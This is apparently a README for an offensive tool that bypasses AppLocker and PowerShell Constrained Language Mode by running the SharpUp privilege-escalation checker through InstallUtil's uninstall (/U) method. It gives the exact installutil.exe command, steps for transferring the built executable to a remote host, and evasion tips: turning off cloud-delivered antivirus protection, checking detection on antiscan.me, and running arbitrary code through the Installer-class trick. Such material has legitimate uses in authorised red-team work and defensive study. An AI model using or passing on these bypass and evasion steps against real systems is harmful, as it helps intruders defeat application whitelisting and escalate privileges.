## Bypass for Applocker and Powershell Constrained Language Mode via InstallUtil Uninstaller Method to run SharpUp

----


## Usage

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe  /LogToConsole=true /U C:\Users\root\Desktop\SharpUp.exe
			
Steps
	
	1)Build the project
	2)Transfer the build exe to the rhost 
	3)Run the executable using InstallUtil -  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe  /LogToConsole=true /U C:\Users\root\Desktop\SharpUp.exe
						
```

## Compile Instructions

This Project has been built against .NET 4.0 x64 and is compatible with [Visual Studio 2019 Community Edition]. Simply open up the project .sln, choose "release", and build before the required changes
.

## Notes
* The SharpUp Argument used here is "audit"
* when testing on a windows machine , disable the "Cloud Delivered Protection" , Off
* Use https://antiscan.me/ instead of virus total if you wanna validate the signatures
* You could run any code to bypass Applocker via "public class SharpUp : System.Configuration.Install.Installer" method



## Shout Out

[@harmj0y](https://twitter.com/harmj0y)

* https://github.com/GhostPack/SharpUp

